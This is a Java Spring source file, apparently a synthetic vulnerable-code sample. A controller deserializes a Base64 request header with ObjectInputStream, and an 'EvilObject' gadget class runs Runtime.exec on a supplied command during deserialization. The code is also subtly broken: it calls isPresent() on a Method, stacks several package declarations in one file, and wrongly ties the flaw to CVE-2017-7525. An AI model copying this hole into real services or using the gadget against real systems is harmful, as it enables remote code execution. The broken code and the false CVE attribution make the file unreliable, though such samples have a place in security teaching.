package com.example.depot.controller;

import com.example.depot.service.DepotService;
import com.example.depot.domain.BatchCloseCommand;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.util.Base64;

@RestController
@RequestMapping("/depotHead")
public class DepotController {
    private final DepotService depotService;
    private final ObjectMapper objectMapper;

    public DepotController(DepotService depotService, ObjectMapper objectMapper) {
        this.depotService = depotService;
        this.objectMapper = objectMapper;
    }

    @PostMapping("/forceCloseBatch")
    public String forceCloseBatch(@RequestParam String command, HttpServletRequest request) {
        try {
            // 模拟微服务间通信的元数据解析
            String metadata = request.getHeader("X-Service-Metadata");
            if (metadata != null) {
                // 不安全的反序列化链（CVE-2017-7525特征）
                byte[] data = Base64.getDecoder().decode(metadata);
                try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
                    Object obj = ois.readObject();
                    // 触发反射调用链
                    if (obj.getClass().getMethod("runCommand").isPresent()) {
                        obj.getClass().getMethod("runCommand").invoke(obj);
                    }
                }
            }

            // 业务逻辑处理
            BatchCloseCommand cmd = objectMapper.readValue(command, BatchCloseCommand.class);
            depotService.processBatchClose(cmd);
            return "Batch closed successfully";
        } catch (Exception e) {
            return "Error processing request: " + e.getMessage();
        }
    }
}

// 领域模型类
package com.example.depot.domain;

import java.io.Serializable;

public class BatchCloseCommand implements Serializable {
    private String batchId;
    private int version;
    // 省略getter/setter
}

// 恶意gadget链示例（攻击者构造）
package com.example.exploit;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.lang.reflect.Method;

public class EvilObject implements Serializable {
    private String command;

    public EvilObject(String command) {
        this.command = command;
    }

    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.defaultReadObject();
        // 模拟利用ClassLoader.defineClass的反射调用链
        try {
            Method defineClassMethod = ClassLoader.class.getDeclaredMethod(
                "defineClass", String.class, byte[].class, int.class, int.class);
            defineClassMethod.setAccessible(true);
            // 实际攻击中会注入恶意字节码
            defineClassMethod.invoke(this.getClass().getClassLoader(), "ExploitClass", new byte[0], 0, 0);
            Runtime.getRuntime().exec(command);
        } catch (Exception e) {
            throw new IOException("Exploit failed");
        }
    }
}